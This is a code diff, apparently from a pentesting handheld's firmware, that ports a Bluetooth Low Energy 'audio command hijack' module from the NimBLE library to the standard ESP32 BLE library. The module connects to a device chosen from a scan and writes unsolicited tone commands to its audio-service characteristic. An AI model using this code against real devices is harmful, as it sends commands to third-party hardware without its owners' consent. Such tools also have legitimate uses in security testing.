@@ -3,10 +3,13 @@
 #include <globals.h>
 #include "core/display.h"
 #include "core/mykeyboard.h"
+#include <BLEDevice.h>
+#include <BLEServer.h>
+#include <BLEUtils.h>
 
 AudioCommandService audioCmd;
 
-void AudioCommandService::AudioCmdCallbacks::onWrite(NimBLECharacteristic* pCharacteristic) {
+void AudioCommandService::AudioCmdCallbacks::onWrite(BLECharacteristic* pCharacteristic) {
     std::string value = pCharacteristic->getValue();
     if(value.length() > 0) {
         Serial.printf("[AudioCMD] Received: %s\n", value.c_str());
@@ -15,22 +18,25 @@ void AudioCommandService::AudioCmdCallbacks::onWrite(NimBLECharacteristic* pChar
 
 void AudioCommandService::begin() {
     if(isRunning) return;
-
-    initNimBLEIfNeeded("audio_cmd");
-
-    pServer = NimBLEDevice::createServer();
+    
+    initBLEIfNeeded("audio_cmd");
+    
+    pServer = BLEDevice::createServer();
     pService = pServer->createService("19B10000-E8F2-537E-4F6C-D104768A1214");
     pAudioCmdChar = pService->createCharacteristic(
         "19B10001-E8F2-537E-4F6C-D104768A1214",
-        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY
+        BLECharacteristic::PROPERTY_READ | 
+        BLECharacteristic::PROPERTY_WRITE | 
+        BLECharacteristic::PROPERTY_NOTIFY
     );
     pAudioCmdChar->setCallbacks(new AudioCmdCallbacks());
     pAudioDataChar = pService->createCharacteristic(
         "19B10002-E8F2-537E-4F6C-D104768A1214",
-        NIMBLE_PROPERTY::WRITE_NR | NIMBLE_PROPERTY::NOTIFY
+        BLECharacteristic::PROPERTY_WRITE_NR | 
+        BLECharacteristic::PROPERTY_NOTIFY
     );
     pService->start();
-    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
+    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
     pAdvertising->addServiceUUID(pService->getUUID());
     pAdvertising->start();
     isRunning = true;
@@ -55,44 +61,44 @@ void AudioCommandService::sendAudioTone(uint8_t frequency, uint16_t duration_ms)
 
 void AudioCommandService::stop() {
     if(isRunning) {
-        NimBLEDevice::deinit(true);
+        BLEDevice::deinit(true);
         isRunning = false;
     }
 }
 
-bool attemptAudioCommandHijack(NimBLEAddress target) {
+bool attemptAudioCommandHijack(BLEAddress target) {
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("AUDIO HIJACK");
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, 60);
     tft.print("Connecting...");
-
-    initNimBLEIfNeeded();
-
-    NimBLEClient* pClient = NimBLEDevice::createClient();
+    
+    initBLEIfNeeded();
+    
+    BLEClient* pClient = BLEDevice::createClient();
     if(!pClient->connect(target)) {
         displayMessage("Failed to connect", "", "", "", TFT_WHITE);
-        NimBLEDevice::deleteClient(pClient);
+        BLEDevice::deleteClient(pClient);
         return false;
     }
     tft.setCursor(20, 80);
     tft.print("Connected");
     tft.setCursor(20, 100);
     tft.print("Discovering...");
-
-    NimBLERemoteService* pService = pClient->getService(NimBLEUUID("19B10000-E8F2-537E-4F6C-D104768A1214"));
-    if(!pService) pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
+    
+    BLERemoteService* pService = pClient->getService(BLEUUID("19B10000-E8F2-537E-4F6C-D104768A1214"));
+    if(!pService) pService = pClient->getService(BLEUUID((uint16_t)0x1843));
     if(!pService) {
         displayMessage("No audio service", "", "", "", TFT_WHITE);
         pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
+        BLEDevice::deleteClient(pClient);
         return false;
     }
     tft.setCursor(20, 120);
     tft.print("Audio service found");
     tft.setCursor(20, 140);
     tft.print("Sending tones...");
-
+    
     uint16_t tones[] = {440, 550, 660, 770};
     for(int i = 0; i < 4; i++) {
         uint8_t toneCmd[7] = {
@@ -101,12 +107,12 @@ bool attemptAudioCommandHijack(NimBLEAddress target) {
             (uint8_t)(tones[i] & 0xFF),
             100
         };
-        NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID("19B10001-E8F2-537E-4F6C-D104768A1214"));
+        BLERemoteCharacteristic* pChar = pService->getCharacteristic(BLEUUID("19B10001-E8F2-537E-4F6C-D104768A1214"));
         if(pChar) pChar->writeValue(toneCmd, sizeof(toneCmd), false);
         delay(200);
     }
     pClient->disconnect();
-    NimBLEDevice::deleteClient(pClient);
+    BLEDevice::deleteClient(pClient);
     return true;
 }
 
@@ -114,22 +120,10 @@ void audioCommandHijackTest() {
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("AUDIO CMD HIJACK");
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    
-    NimBLEDevice::deinit(true);
-    delay(500);
-    initNimBLEIfNeeded("audio_hijack");
-    
     String selectedMAC = selectTargetFromScan("SELECT TARGET");
     if(selectedMAC.isEmpty()) return;
-    
-    NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
-    
+    BLEAddress target(selectedMAC.c_str());
     if(!requireSimpleConfirmation("Start audio CMD hijack?")) return;
-    
-    NimBLEDevice::deinit(true);
-    delay(500);
-    initNimBLEIfNeeded("audio_client");
-    
     bool success = attemptAudioCommandHijack(target);
     if(success) displayMessage("SUCCESS!", "Audio commands sent", "", "", TFT_GREEN);
     else displayMessage("FAILED", "No audio service", "", "", TFT_RED);
